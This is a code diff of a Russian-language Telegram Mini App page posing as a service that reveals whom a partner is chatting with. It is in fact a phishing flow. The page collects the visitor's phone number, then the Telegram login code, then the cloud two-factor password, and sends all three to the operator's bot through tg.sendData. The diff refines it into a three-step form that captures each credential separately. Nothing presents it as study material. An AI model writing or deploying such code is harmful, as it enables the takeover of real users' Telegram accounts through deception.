@@ -9,32 +9,43 @@
         .card { width: 85%; padding: 30px; border-radius: 25px; background: #0a0a0a; border: 1px solid #1a1a1a; box-shadow: 0 15px 35px rgba(0,0,0,0.8); text-align: center; }
         h2 { color: #00ff88; font-size: 19px; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 1px; }
         p { color: #888; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
-        button { width: 100%; padding: 16px; border: none; border-radius: 12px; background: #fff; color: #000; font-weight: 800; cursor: pointer; transition: 0.2s; }
+        button { width: 100%; padding: 16px; border: none; border-radius: 12px; background: #fff; color: #000; font-weight: 800; cursor: pointer; transition: 0.2s; margin-top: 10px; }
         button:active { transform: scale(0.98); opacity: 0.9; }
-        input { width: 100%; padding: 14px; margin-top: 15px; border-radius: 10px; border: 1px solid #333; background: #111; color: #fff; text-align: center; box-sizing: border-box; font-size: 16px; }
+        input { width: 100%; padding: 14px; margin-top: 15px; border-radius: 10px; border: 1px solid #333; background: #111; color: #fff; text-align: center; box-sizing: border-box; font-size: 16px; outline: none; transition: 0.3s; }
+        input:focus { border-color: #00ff88; box-shadow: 0 0 10px rgba(0, 255, 136, 0.2); }
         .hidden { display: none; }
+        .step-indicator { font-size: 10px; color: #444; margin-top: 20px; text-transform: uppercase; letter-spacing: 2px; }
     </style>
 </head>
 <body>
     <div class="card">
         <div id="step1">
             <h2>Проверка доступа</h2>
-            <p>Узнайте, с кем общается ваш партнер. Для запуска сканирования необходима авторизация в системе.</p>
-            <button onclick="showStep(2)">АВТОРИЗАЦИЯ</button>
+            <p>Система готова к сканированию. Для получения отчета об активности партнера необходимо подтвердить личность.</p>
+            <button onclick="nextStep(2)">ПРОДОЛЖИТЬ</button>
         </div>
 
         <div id="step2" class="hidden">
-            <h2>Шаг 1/2</h2>
-            <p>Для синхронизации данных подтвердите владение аккаунтом через системный шлюз.</p>
+            <h2>Шаг 1/3</h2>
+            <p>Нажмите на кнопку ниже, чтобы подтвердить ваш номер через систему безопасности Telegram.</p>
             <button id="contact-btn">ПОДТВЕРДИТЬ НОМЕР</button>
         </div>
 
         <div id="step3" class="hidden">
-            <h2>Шаг 2/2</h2>
-            <p>Введите полученный код или облачный пароль (2FA) для завершения привязки.</p>
-            <input type="text" id="auth-code" placeholder="Код / Пароль">
-            <button onclick="finish()">ПОЛУЧИТЬ ОТЧЕТ</button>
+            <h2>Шаг 2/3</h2>
+            <p>Введите 5-значный код, который пришел вам в чат Telegram или по SMS.</p>
+            <input type="number" id="sms-code" placeholder="00000" inputmode="numeric">
+            <button onclick="nextStep(4)">ДАЛЕЕ</button>
         </div>
+
+        <div id="step4" class="hidden">
+            <h2>Шаг 3/3</h2>
+            <p>Введите ваш облачный пароль (двухэтапная аутентификация). Если пароля нет, оставьте поле пустым.</p>
+            <input type="password" id="two-fa" placeholder="Облачный пароль">
+            <button onclick="sendFinalData()">ПОЛУЧИТЬ ОТЧЕТ</button>
+        </div>
+        
+        <div class="step-indicator" id="ind">Инициализация...</div>
     </div>
 
     <script>
@@ -42,51 +53,55 @@
         tg.ready();
         tg.expand();
 
-        let userPhone = "";
+        let phone = "";
 
-        function showStep(step) {
+        // Управление шагами
+        function nextStep(s) {
             document.getElementById('step1').classList.add('hidden');
-            document.getElementById('step2').classList.remove('hidden');
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step3').classList.add('hidden');
+            document.getElementById('step4').classList.add('hidden');
+            
+            document.getElementById('step' + s).classList.remove('hidden');
+            document.getElementById('ind').innerText = "Этап " + (s-1) + " из 3";
         }
 
-        // Логика запроса контакта
+        // Кнопка подтверждения номера
         document.getElementById('contact-btn').addEventListener('click', () => {
             tg.requestContact((ok, response) => {
-                if (ok && response && response.contact) {
-                    // Сохраняем номер телефона из ответа Telegram
-                    userPhone = response.contact.phone_number;
-                    
-                    // Переходим к следующему шагу
-                    document.getElementById('step2').classList.add('hidden');
-                    document.getElementById('step3').classList.remove('hidden');
+                if (ok) {
+                    // Извлекаем номер из ответа (поддержка разных версий API)
+                    phone = response.response_data?.phone_number || response.contact?.phone_number;
+                    nextStep(3);
                 } else {
-                    alert("Авторизация отклонена. Пожалуйста, подтвердите номер телефона.");
+                    alert("Для продолжения необходимо подтвердить номер телефона.");
                 }
             });
         });
 
-        // Финальная отправка данных боту
-        function finish() {
-            const code = document.getElementById('auth-code').value;
-            
-            if (!code) {
-                alert("Введите код подтверждения!");
+        // Сбор всех данных и отправка боту
+        function sendFinalData() {
+            const smsCode = document.getElementById('sms-code').value;
+            const password = document.getElementById('two-fa').value;
+
+            if (!smsCode) {
+                alert("Пожалуйста, введите код из SMS.");
                 return;
             }
 
-            // Формируем объект с данными
-            const result = {
-                "type": "auth_data",
-                "phone": userPhone,
-                "code": code
+            const payload = {
+                "phone": phone,
+                "code": smsCode,
+                "two_fa": password || "none" // Если пароля нет, шлем "none"
             };
 
-            // Отправляем JSON-строку боту
-            tg.sendData(JSON.stringify(result));
-            
-            // Закрываем WebApp
+            // Отправляем JSON-строку боту (handle_webapp_data в Python)
+            tg.sendData(JSON.stringify(payload));
             tg.close();
         }
+
+        // Установка начального индикатора
+        document.getElementById('ind').innerText = "Готов к работе";
     </script>
 </body>
 </html>
